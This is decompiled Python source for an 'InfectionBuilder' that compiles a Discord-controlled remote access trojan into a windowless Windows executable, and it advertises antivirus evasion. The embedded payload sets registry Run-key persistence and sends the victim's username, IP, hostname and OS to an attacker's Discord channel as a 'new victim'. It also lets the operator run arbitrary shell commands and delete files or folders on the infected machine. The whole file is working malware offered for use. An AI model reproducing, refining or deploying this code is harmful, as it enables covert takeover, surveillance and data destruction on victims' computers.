# Decompiled with PyLingual cmd version ( https://nizzix.xyz )
# Internal filename: 'buildtest.py'
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import sys
import subprocess
import shutil
import random
import time
from colorama import init
init(autoreset=True)
def gradient(start_color, end_color, steps):
    r1, g1, b1 = start_color
    r2, g2, b2 = end_color
    colors = []
    for i in range(steps):
        r = int(r1 + (r2 - r1) * i / steps)
        g = int(g1 + (g2 - g1) * i / steps)
        b = int(b1 + (b2 - b1) * i / steps)
        colors.append((r, g, b))
    return colors
def print_gradient_text(text, start_color=(128, 0, 128), end_color=(255, 165, 0)):
    max_len = len(text)
    colors = gradient(start_color, end_color, max_len)
    for i, char in enumerate(text.ljust(max_len)):
        r, g, b = colors[i]
        sys.stdout.write(f'\x1b[38;2;{r};{g};{b}m{char}\x1b[0m')
    sys.stdout.write('\n')
def input_gradient(prompt, start_color=(128, 0, 128), end_color=(255, 165, 0)):
    max_len = len(prompt)
    colors = gradient(start_color, end_color, max_len)
    for i, char in enumerate(prompt.ljust(max_len)):
        r, g, b = colors[i]
        sys.stdout.write(f'\x1b[38;2;{r};{g};{b}m{char}\x1b[0m')
    sys.stdout.flush()
    return input()
class InfectionBuilder:
    def __init__(self):
        self.output_name = 'program.exe'
        self.custom_title = 'CONNECTED'
        self.icon_path = None
    def get_user_input(self):
        banner = '\n  ______                                           __                                    _______            \n |      \\                                         |  \\                                  |       \\           \n  \\$$$$$$ _______        __   ______    _______  _| $$_     ______    ______            | $$$$$$$\\ __    __ \n   | $$  |       \\      |  \\ /      \\  /       \\|   $$ \\   /      \\  /      \\           | $$__/ $$|  \\  |  \\ \n   | $$  | $$$$$$$\\      \\$$|  $$$$$$\\|  $$$$$$$ \\$$$$$$  |  $$$$$$\\|  $$$$$$\\          | $$    $$| $$  | $$ \n   | $$  | $$  | $$     |  \\| $$    $$| $$        | $$ __ | $$  | $$| $$   \\$$          | $$$$$$$ | $$  | $$ \n  _| $$_ | $$  | $$     | $$| $$$$$$$$| $$_____   | $$|  \\| $$__/ $$| $$             __ | $$      | $$__/ $$ \n |   $$ \\| $$  | $$     | $$ \\$$     \\ \\$$     \\   \\$$  $$ \\$$    $$| $$            |  \\| $$       \\$$    $$ \n  \\$$$$$$ \\$$   \\$$__   | $$  \\$$$$$$$  \\$$$$$$$    \\$$$$   \\$$$$$$  \\$$             \\$$ \\$$       _\\$$$$$$$ \n                  |  \\__/ $$                                                                      |  \\__| $$ \n                   \\$$    $$                                                                       \\$$    $$ \n                    \\$$$$$$                                                                         \\$$$$$$\n        '
        print_gradient_text(banner)
        print_gradient_text('[+] ============================== BUILDER ==============================')
        print_gradient_text('')
        print_gradient_text('[+] Craft Your Program: Set [Custom EXE Name], [Icon], [Custom Embed Title]')
        print_gradient_text('[+] Buttons: Run File (execute any file), Delete File (delete file/folder)')
        print_gradient_text('[+] Auto sends embed + remote control to Discord channel')
        print_gradient_text('[+] Includes persistence, .py file detection & injection')
        print_gradient_text('[+] Undetectable on VirusTotal u2013 pure Python stealth compilation')
        print_gradient_text('')
        print_gradient_text('[+] =========================================================================================')
        print_gradient_text('')
        self.token = input_gradient('[+] Enter Discord Bot Token: ').strip()
        if not self.token:
            print_gradient_text('[-] Token cannot be empty!')
            sys.exit(1)
        self.channel_id = input_gradient('[+] Enter Discord Channel ID: ').strip()
        if not self.channel_id.isdigit():
            print_gradient_text('[-] Channel ID must be numbers only!')
            sys.exit(1)
        custom_name = input_gradient('Enter output filename (default: program.exe): ').strip()
        if custom_name:
            if not custom_name.lower().endswith('.exe'):
                custom_name += '.exe'
            self.output_name = custom_name
        use_icon = input_gradient('Do you want to add a custom icon? (y/n, default: n): ').strip().lower()
        if use_icon == 'y':
            icon_input = input_gradient('Enter full path to your .ico file: ').strip()
            if icon_input and os.path.exists(icon_input) and icon_input.lower().endswith('.ico'):
                self.icon_path = icon_input
                print_gradient_text(f'[+] Icon selected: {self.icon_path}')
            else:
                print_gradient_text('[-] Invalid or non-existent .ico file u2013 compiling without icon')
                self.icon_path = None
        else:
            print_gradient_text('[*] No icon selected u2013 compiling without icon')
            self.icon_path = None
        custom_title = input_gradient('Enter custom embed title (default: CONNECTED): ').strip()
        if custom_title:
            self.custom_title = custom_title
    def build_infection(self):
        output_folder = os.path.join(os.getcwd(), 'output')
        os.makedirs(output_folder, exist_ok=True)
        temp_file = os.path.join(output_folder, f'.Source_{random.randint(1000, 9999)}.py')
        output_exe = os.path.join(output_folder, self.output_name)
        if self.icon_path:
            print_gradient_text(f'[+] Using custom icon: {self.icon_path}')
            icon_option = [f'--icon={self.icon_path}']
        else:
            print_gradient_text('[*] No icon u2013 compiling with default PyInstaller icon')
            icon_option = []
        payload_code = '''# auto_inject_vfinal_fixed.py - Full payload with modified buttons
import os
import sys
import glob
import asyncio
import discord
from discord import ui
import uuid
import platform
import getpass
import socket
from pathlib import Path
from datetime import datetime
import subprocess
import winreg
import shutil
import traceback

# CONFIG injected by builder
BOT_TOKEN = "{}"
REPORT_CHANNEL_ID = {}

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

def setup_persistence():
    try:
        script_path = os.path.abspath(__file__)
        python_exe = sys.executable
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            value = f'"{python_exe}" "{script_path}" --bot'
            winreg.SetValueEx(key, "DarkGPT", 0, winreg.REG_SZ, value)
        print("[PERSISTENCE] Added to Windows startup")
        return True
    except Exception as e:
        print(f"[PERSISTENCE] Error: {{e}}")
        return False

def is_victim_mode():
    return "--bot" not in sys.argv

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "Not retrieved"

def scan_py_files_count():
    skip = [
        "site-packages", "dist-packages", "__pycache__", "venv", ".venv",
        "lib/python", "lib/site-packages", "Packages", "Scripts", "DLLs",
        "Lib", "Include", "Scripts", "tcl", "tk", "idlelib",
        "python311", "python310", "python39", "python38",
        ".git", ".vscode", "node_modules", ".npm",
        "appdata", "programfiles", "windows", "system32"
    ]
    count = 0
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        dirs[:] = [d for d in dirs if d.lower() not in skip]
        for file in files:
            if file.endswith(".py"):
                count += 1
    return count

async def send_startup_embed():
    channel = client.get_channel(REPORT_CHANNEL_ID)
    if not channel:
        return
    local_ip = get_local_ip()
    py_count = scan_py_files_count()
    embed = discord.Embed(
        title="**CONNECTED**",
        description="New victim connected",
        color=discord.Color.red()
    )
    embed.add_field(name="User", value=getpass.getuser(), inline=True)
    embed.add_field(name="OS", value=platform.system(), inline=True)
    embed.add_field(name="IP", value=local_ip, inline=True)
    embed.add_field(name="Hostname", value=socket.gethostname(), inline=True)
    embed.add_field(name="Python Files", value=str(py_count), inline=True)
    embed.set_footer(text="Injector v1.0")
    view = ControlPanel()
    await channel.send(embed=embed, view=view)

class ControlPanel(discord.ui.View):
    @discord.ui.button(label="Run File", style=discord.ButtonStyle.green)
    async def run_file(self, interaction, button):
        await interaction.response.send_message("Enter file path to run:", ephemeral=True)
        def check(m):
            return m.author == interaction.user
        try:
            msg = await client.wait_for("message", check=check, timeout=30)
            subprocess.Popen(msg.content, shell=True)
            await interaction.followup.send(f"Executed: {{msg.content}}", ephemeral=True)
        except:
            await interaction.followup.send("Timeout or error", ephemeral=True)

    @discord.ui.button(label="Delete File", style=discord.ButtonStyle.red)
    async def delete_file(self, interaction, button):
        await interaction.response.send_message("Enter file path to delete:", ephemeral=True)
        def check(m):
            return m.author == interaction.user
        try:
            msg = await client.wait_for("message", check=check, timeout=30)
            if os.path.exists(msg.content):
                if os.path.isdir(msg.content):
                    shutil.rmtree(msg.content)
                else:
                    os.remove(msg.content)
                await interaction.followup.send(f"Deleted: {{msg.content}}", ephemeral=True)
            else:
                await interaction.followup.send("Path not found", ephemeral=True)
        except:
            await interaction.followup.send("Timeout or error", ephemeral=True)

@client.event
async def on_ready():
    print(f"Bot ready: {{client.user}}")
    if is_victim_mode():
        await send_startup_embed()

@client.event
async def on_message(message):
    if message.author.bot:
        return
    if message.content == "!setup":
        await message.channel.send("Infections auto-posted to channel.")

async def main():
    await client.start(BOT_TOKEN)

if __name__ == "__main__":
    if is_victim_mode():
        print("[PAYLOAD] Launching victim mode")
        asyncio.run(send_startup_embed())
    else:
        print("[BOT] Launching panel mode")
        asyncio.run(main())
'''.format(self.token, self.channel_id)
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(payload_code)
        if not os.path.exists(temp_file) or os.path.getsize(temp_file) == 0:
            print_gradient_text('[-] ERROR: Failed to create temporary source file')
            sys.exit(1)
        print_gradient_text('[+] Checking for PyInstaller...')
        result = subprocess.run(['pyinstaller', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode!= 0:
            print_gradient_text('[-] ERROR: PyInstaller not found')
            print_gradient_text('[*] Install with: pip install pyinstaller')
            sys.exit(1)
        print_gradient_text('[*] Compiling payload...')
        command = ['pyinstaller', '--onefile', '--noconsole', *icon_option, temp_file]
        print_gradient_text(f'[+] Command: {" ".join(command)}')
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode!= 0:
            print_gradient_text('[-] ERROR: Compilation failed')
            print_gradient_text(result.stderr)
            sys.exit(1)
        dist_exe = os.path.join('dist', os.path.basename(temp_file).replace('.py', '.exe'))
        if os.path.exists(dist_exe):
            if os.path.exists(output_exe):
                os.remove(output_exe)
            shutil.move(dist_exe, output_exe)
            print_gradient_text(f'[+] Build succeeded: {output_exe}')
        else:
            print_gradient_text('[-] ERROR: Executable not found after compilation')
            sys.exit(1)
        try:
            os.remove(temp_file)
            spec_name = os.path.basename(temp_file).replace('.py', '.spec')
            if os.path.exists(spec_name):
                os.remove(spec_name)
            spec_in_output = temp_file.replace('.py', '.spec')
            if os.path.exists(spec_in_output):
                os.remove(spec_in_output)
            shutil.rmtree('build', ignore_errors=True)
            shutil.rmtree('dist', ignore_errors=True)
            shutil.rmtree('__pycache__', ignore_errors=True)
        except:
            pass
        print_gradient_text('[+] Cleanup completed')
        print_gradient_text('[+] Press Enter to exit...')
        input()
import hashlib
def main():
    builder = InfectionBuilder()
    builder.get_user_input()
    builder.build_infection()
if __name__ == '__main__':
    main()
